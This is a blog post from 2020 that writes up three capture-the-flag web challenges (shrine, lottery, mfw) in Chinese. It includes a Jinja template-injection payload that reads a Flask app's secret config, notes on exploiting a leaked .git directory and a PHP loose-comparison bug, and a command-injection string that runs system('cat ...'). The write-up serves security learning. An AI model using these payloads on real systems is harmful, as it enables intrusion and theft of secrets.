<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    0509/shrine&amp;lottery&amp;mfw |
    
    MrzBlog</title>
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/technology.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<script src="/js/pace.min.js"></script>

<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <section class="outer">
  <article id="post-0509/shrine&amp;lottery&amp;mfw" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      0509/shrine&amp;lottery&amp;mfw
    </h1>
  

      </header>
    

    
      <div class="article-meta">
        <a href="/2020/05/25/0509/shrine&lottery&mfw/" class="article-date">
  <time datetime="2020-05-25T15:07:14.681Z" itemprop="datePublished">2020-05-25</time>
</a>
        
      </div>
    

    <div class="article-entry" itemprop="articleBody">
      

      

      
        <h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>1.进入网站看到一段python代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>) @ app.route(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read() @ app.route(<span class="string">'/shrine/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        <span class="comment">#过滤括号</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="comment">#过滤config 和self</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>2.不了解框架，直接上网搜payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-lottery"><a href="#2-lottery" class="headerlink" title="2.lottery"></a>2.lottery</h2><p>1.发现robots.txt中泄露了.git</p>
<p>2.利用githack下载源码</p>
<p>3.在api.php中发现了猜数字的代码，存在弱类型“==”漏洞。传入参数[true,true…..]即可得到钱。</p>
<h2 id="3-mfw"><a href="#3-mfw" class="headerlink" title="3.mfw"></a>3.mfw</h2><p>1.网页提示git，怀疑存在git泄露</p>
<p>2.利用githack下载源码，发现flag.php但是并没有内容</p>
<p>3.继续看index.php发现存在命令执行漏洞。构造page=abc’) or system(“cat templates/flag.php”);//传入即可</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://rookiez996.github.io/2020/05/25/0509/shrine&lottery&mfw/" data-id="ckammmwaj0005g8ui8v4xgyz5"
         class="article-share-link">分享</a>
      
    </footer>

  </div>

  
    
  <nav class="article-nav">
    
      <a href="/2020/05/25/0511/fakebook&ics-05/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            0511/fakebook&amp;ics-05
          
        </div>
      </a>
    
    
      <a href="/2020/05/25/0508/Web_php_unserialize&supersqli&easy_tornado/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">0508/Web_php_unserialize&amp;supersqli&amp;easy_tornado</div>
      </a>
    
  </nav>


  

  
    
  

</article>



</section>
    </div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>






<script src="/js/technology.js"></script>


  </div>
</body>
</html>